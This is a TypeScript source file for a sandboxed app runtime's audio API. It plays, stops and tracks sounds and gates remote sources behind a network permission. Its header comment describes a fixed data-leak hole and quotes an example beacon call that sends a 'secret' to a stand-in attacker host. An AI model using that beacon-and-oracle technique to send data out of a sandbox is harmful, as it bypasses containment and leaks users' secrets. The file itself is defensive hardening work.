/**
 * `softn.audio.*`: the app's sounds, by the handle its script holds.
 *
 * Playing a bundle's own sound needs no capability: a `blob:`, `data:` or
 * bundle-relative source carries its bytes with it, reads nothing and sends
 * nothing, and a template can write `<audio src=… autoPlay>` for the same
 * effect. A remote source is a different act. `new Audio(url)` issues the GET
 * whether or not autoplay policy lets the sound out, and `audio.whenEnded`
 * reports 'ended' separately from 'error' — so an unchecked remote src is not
 * only a beacon, it is a read-back oracle telling the bundle whether the
 * request succeeded. That is `softn.net.fetch` wearing a different name, and
 * it goes behind the same gate and the same allowed_hosts list.
 *
 * This comment used to say "sound is a nuisance, not a disclosure: it reads
 * nothing, sends nothing", and that reasoning was why no gate was here.
 * Proven wrong against the real runtime: with every capability withheld,
 * audio.play('https://attacker.example/beacon?secret=1') constructed the
 * element with that exact URL and answered {played:true}.
 */

import { isRemoteUrl } from '../../renderer/sanitize-html';
import type { PendingHostCall } from '../script-runtime-types';
import type { HostGate } from './permissions';

/** How a sound reached silence — what `audio.whenEnded` resolves with. */
interface AudioOutcome {
  handle: string;
  status: 'ended' | 'stopped' | 'error';
  durationMs?: number;
  reason?: string;
}

/** How many finished sounds' outcomes are remembered for a late `whenEnded`. */
const MAX_FINISHED = 256;

export class AppAudio {
  /** Sounds this app currently has playing, by the handle its script holds.
   *  `watchers` are pending `whenEnded` calls; each hears exactly one outcome. */
  private readonly playing = new Map<
    string,
    {
      el: HTMLAudioElement;
      volume: number;
      watchers: Array<(outcome: AudioOutcome) => void>;
    }
  >();
  /** Outcomes of sounds that are gone, so a `whenEnded` asked after the fact
   *  still answers with what happened. Every one-shot lands here, so it is
   *  capped — the oldest is forgotten and reads as unknown. */
  private readonly finished = new Map<string, AudioOutcome>();
  private masterVolume = 1;
  private seq = 0;
  /** Gesture listeners waiting to start a soundtrack the browser refused. */
  private readonly unlockers = new Set<() => void>();

  /**
   * @param assetFunction The host's `asset()`, read when a sound is played:
   *   what turns a path in the bundle into a URL an <audio> can load.
   */
  constructor(
    private readonly gate: HostGate,
    private readonly assetFunction: () => ((...args: unknown[]) => unknown) | undefined
  ) {}

  /**
   * Turn whatever the script passed into something an <audio> can load.
   *
   * Scripts say `softn.audio.play("assets/blip.wav")` — a path inside their own
   * bundle, which only the host knows how to resolve. That is the same job
   * `asset()` does for templates, so it is the same function doing it.
   */
  private resolveSrc(src: string): string {
    if (!src) return '';
    if (/^(blob:|data:|https?:)/i.test(src)) return src;
    const asset = this.assetFunction();
    if (typeof asset === 'function') {
      const resolved = asset(src);
      if (typeof resolved === 'string' && resolved) return resolved;
    }
    return src;
  }

  async play(call: PendingHostCall): Promise<unknown> {
    if (typeof Audio === 'undefined') return { played: false, reason: 'no audio support' };

    const [rawSrc, optionsJson] = call.args;
    const options = optionsJson
      ? (JSON.parse(optionsJson) as {
          volume?: number;
          loop?: boolean;
          rate?: number;
        })
      : {};

    const src = this.resolveSrc(rawSrc);
    if (!src) return { played: false, reason: `no such sound: ${rawSrc}` };

    // Checked on the resolved URL, not the argument: `asset()` answers with a
    // blob: or data: URL for a bundle path, and a path it does not recognise
    // comes back unchanged — including a protocol-relative `//host/x`, which
    // the browser resolves against the page's own http(s) scheme.
    if (isRemoteUrl(src)) {
      this.gate.checkPermission('net');
      this.gate.checkNetHost(src);
    }

    const el = new Audio(src);
    const own = typeof options.volume === 'number' ? Math.max(0, Math.min(1, options.volume)) : 1;
    el.volume = own * this.masterVolume;
    el.loop = options.loop === true;
    if (typeof options.rate === 'number' && options.rate > 0) el.playbackRate = options.rate;

    const handle = `snd-${++this.seq}`;
    // The sound's own volume is kept beside it: master volume scales it, and
    // reading it back off the element would fold the master in twice.
    this.playing.set(handle, { el, volume: own, watchers: [] });
    // One-shots clear themselves; loops stay until stopped or the app closes.
    el.addEventListener(
      'ended',
      () => {
        const outcome: AudioOutcome = { handle, status: 'ended' };
        if (Number.isFinite(el.duration)) outcome.durationMs = el.duration * 1000;
        this.finish(handle, outcome);
      },
      { once: true }
    );
    // A src that fails to decode reports itself here, not through play() — a
    // watcher waiting on the sound would otherwise wait forever.
    el.addEventListener(
      'error',
      () => {
        this.finish(handle, {
          handle,
          status: 'error',
          reason: el.error?.message || 'could not play',
        });
      },
      { once: true }
    );

    try {
      await el.play();
      return { played: true, handle };
    } catch (err) {
      const name =
        typeof err === 'object' && err !== null ? (err as { name?: string }).name : undefined;
      // Browsers refuse to make noise before the user has interacted with the
      // page. That is the policy working, not a fault, so it is reported rather
      // than thrown — and a soundtrack (anything looping) is held back and
      // started on the first gesture instead of being silently lost.
      if (name === 'NotAllowedError') {
        if (el.loop) {
          this.armUnlock(handle, el);
          return { played: false, blocked: true, pending: true, handle };
        }
        this.playing.delete(handle);
        return {
          played: false,
          blocked: true,
          reason: 'the page has not been interacted with yet',
        };
      }
      this.playing.delete(handle);
      return { played: false, reason: name ?? 'could not play' };
    }
  }

  /** Start a blocked loop as soon as the user touches the page, once. */
  private armUnlock(handle: string, el: HTMLAudioElement): void {
    if (typeof window === 'undefined') return;
    const start = () => {
      window.removeEventListener('pointerdown', start);
      window.removeEventListener('keydown', start);
      this.unlockers.delete(start);
      // It may have been stopped, or the whole runtime torn down, while waiting.
      if (this.gate.disposed() || !this.playing.has(handle)) return;
      el.play().catch(() => {
        this.finish(handle, { handle, status: 'error', reason: 'could not play' });
      });
    };
    this.unlockers.add(start);
    window.addEventListener('pointerdown', start, { once: true });
    window.addEventListener('keydown', start, { once: true });
  }

  /**
   * The one place a sound becomes past tense: watchers hear the outcome, the
   * handle stops being live, and the outcome is kept for late askers. First
   * outcome wins — a stop landing after an error, or the 'error' that clearing
   * `src` on teardown fires, must not rewrite what already happened.
   */
  private finish(handle: string, outcome: AudioOutcome): void {
    const sound = this.playing.get(handle);
    if (!sound) return;
    for (const watcher of sound.watchers) watcher(outcome);
    this.playing.delete(handle);
    this.finished.set(handle, outcome);
    if (this.finished.size > MAX_FINISHED) {
      const oldest = this.finished.keys().next().value;
      if (oldest !== undefined) this.finished.delete(oldest);
    }
  }

  async stop(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    if (!handle) return this.stopAll();
    const sound = this.playing.get(handle);
    if (!sound) return { stopped: false };
    sound.el.pause();
    sound.el.currentTime = 0;
    this.finish(handle, { handle, status: 'stopped' });
    return { stopped: true };
  }

  async stopAll(): Promise<unknown> {
    const count = this.playing.size;
    this.silence();
    return { stopped: count };
  }

  async setVolume(call: PendingHostCall): Promise<unknown> {
    const value = Number(call.args[0]);
    if (!Number.isFinite(value)) return { volume: this.masterVolume };
    this.masterVolume = Math.max(0, Math.min(1, value));
    // Applies to what is already playing too, or turning the music down would
    // only take effect on the next sound.
    for (const sound of this.playing.values()) {
      sound.el.volume = sound.volume * this.masterVolume;
    }
    return { volume: this.masterVolume };
  }

  /**
   * Resolves when the sound is over, with how it got there: 'ended' on its
   * own, 'stopped' by a script or teardown, 'error' if it never could play.
   * The distinction is the point — being cut off must never read as having
   * finished. A handle nothing remembers answers immediately: whatever it
   * once named, it is not playing now.
   */
  async whenEnded(call: PendingHostCall): Promise<unknown> {
    const [handle] = call.args;
    const finished = this.finished.get(handle);
    if (finished) return finished;
    const sound = this.playing.get(handle);
    if (!sound) return { handle, status: 'ended', known: false };
    return new Promise<AudioOutcome>((resolve) => {
      sound.watchers.push(resolve);
    });
  }

  /** Stop every sound, and every soundtrack still waiting for a gesture. */
  silence(): void {
    for (const [handle, { el }] of this.playing) {
      try {
        el.pause();
        el.src = '';
      } catch {
        // The element may already be detached; nothing left to stop.
      }
      this.finish(handle, { handle, status: 'stopped' });
    }
    this.playing.clear();
    if (typeof window !== 'undefined') {
      for (const unlock of this.unlockers) {
        window.removeEventListener('pointerdown', unlock);
        window.removeEventListener('keydown', unlock);
      }
    }
    this.unlockers.clear();
  }
}
